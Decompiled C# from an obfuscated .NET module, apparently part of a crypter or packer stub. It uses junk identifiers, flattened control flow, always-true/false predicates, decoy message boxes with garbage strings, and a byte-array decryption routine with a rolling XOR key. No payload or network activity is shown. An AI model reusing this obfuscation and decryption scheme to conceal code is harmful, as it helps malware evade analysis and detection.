using System;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace bjrdkskshrst;

[StandardModule]
public sealed class gNCKD9aZ5KQR2cPI
{
	private static object zUoWBuwwB()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		Siw6FRB4kJcwZuM6Dhx();
		if (!w9Kj4sBeolRcVORWLPm())
		{
		}
		checked
		{
			object result = default(object);
			while (true)
			{
				int num = 3989;
				int num2 = 2;
				if (!Siw6FRB4kJcwZuM6Dhx())
				{
					goto IL_0012;
				}
				goto IL_004f;
				IL_004f:
				switch (num2)
				{
				case 2:
					goto IL_0025;
				case 3:
					MessageBox.Show("N{Za^e{b…c0LFy:o‚K>>TYE>o$‡CW)wzN!g#6`{*ˆ<@Z„K.ŽiH@hBI;‡U<…ZqX*|\u007fI‘E27XAc3H79}LCˆ‹l.|/X$xs`\u008dn@LP2WmZL||Rƒ‘$. $nj‚aex\u007fŽ p„Œ_Ri^fBz‹%t0„‰+.:>}");
					MessageBox.Show("V\u0090iS<J{EJuG'‘ŒZ\u0090jYjdp5fZˆ~MtTYg3G\u0081>3;V\u0081wQ‹RH\u008fu");
					break;
				case 0:
				case 1:
				case 4:
				case 6:
					continue;
				case 5:
					try
					{
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						int num3 = 88560;
						do
						{
							new decimal(71L);
							try
							{
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
							MessageBox.Show("\u008fw+4&’9 ^=38d‘e7+7UkCx-†:IGxuB<u‘\\oAŒCu_‘T…pˆT\u0090m4&MM$Œ-6j8ŒpkT=< Q9(AD={U‰l‚†P\u0090yKldn‡‚p%N");
							Interaction.MsgBox((object)"Mm429y", (MsgBoxStyle)0, (object)null);
							num3++;
						}
						while (num3 <= 634571);
						dnlWJ9Bvo2GlrFXa3hk("qY6Pw021JLw", (MsgBoxStyle)0, null);
						YGqJ22BNKf9BseGs2Wq();
					}
					return 46800566;
				case 8:
					return result;
				}
				goto IL_0012;
				IL_0012:
				num++;
				goto IL_0025;
				IL_0025:
				while (num > 1)
				{
					num2 = 5;
					if (!Siw6FRB4kJcwZuM6Dhx())
					{
						continue;
					}
					goto IL_004f;
				}
				num2 = 3;
				if (w9Kj4sBeolRcVORWLPm())
				{
					continue;
				}
				goto IL_004f;
			}
		}
	}

	public static byte[] smethod_0(byte[] Data, string keys)
	{
		checked
		{
			while (true)
			{
				byte[] array = (byte[])N7NsJPBxYCetqlVYuWi(QP9HVuBlT9W52ClaWeX(), keys);
				while (true)
				{
					IL_0006:
					int num = Data.Length * 2 + array.Length;
					_ = 0;
					if (!Siw6FRB4kJcwZuM6Dhx())
					{
						goto IL_0086;
					}
					goto IL_0082;
					IL_0082:
					if (num >= 0)
					{
						Data[unchecked(num % Data.Length)] = (byte)unchecked(checked(unchecked(Data[num % Data.Length] ^ array[num % array.Length]) - unchecked((int)Data[checked(num + 1) % Data.Length]) + 256) % 256);
						goto IL_007e;
					}
					goto IL_0086;
					IL_0086:
					while (true)
					{
						IL_0086_2:
						int num2 = 7;
						if (!Siw6FRB4kJcwZuM6Dhx())
						{
							break;
						}
						while (true)
						{
							switch (num2)
							{
							case 3:
								break;
							default:
								num2 = 1;
								if (!w9Kj4sBeolRcVORWLPm())
								{
									continue;
								}
								goto IL_007e;
							case 1:
								goto IL_007e;
							case 2:
							case 5:
								goto IL_0082;
							case 0:
							case 4:
								goto IL_0086_2;
							case 6:
								goto end_IL_0086;
							case 7:
								return Data;
							}
							break;
						}
						goto IL_0006;
						continue;
						end_IL_0086:
						break;
					}
					break;
					IL_007e:
					num += -1;
					goto IL_0082;
				}
			}
		}
	}

	internal static DialogResult RobT55BaEO3aVkxgsSq(object object_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show((string)object_0);
	}

	internal static MsgBoxResult dnlWJ9Bvo2GlrFXa3hk(object object_0, MsgBoxStyle msgBoxStyle_0, object object_1)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		return Interaction.MsgBox(object_0, msgBoxStyle_0, object_1);
	}

	internal static void YGqJ22BNKf9BseGs2Wq()
	{
		ProjectData.ClearProjectError();
	}

	internal static bool Siw6FRB4kJcwZuM6Dhx()
	{
		return true;
	}

	internal static bool w9Kj4sBeolRcVORWLPm()
	{
		return false;
	}

	internal static object QP9HVuBlT9W52ClaWeX()
	{
		return Encoding.Default;
	}

	internal static object N7NsJPBxYCetqlVYuWi(object object_0, object object_1)
	{
		return ((Encoding)object_0).GetBytes((string)object_1);
	}
}
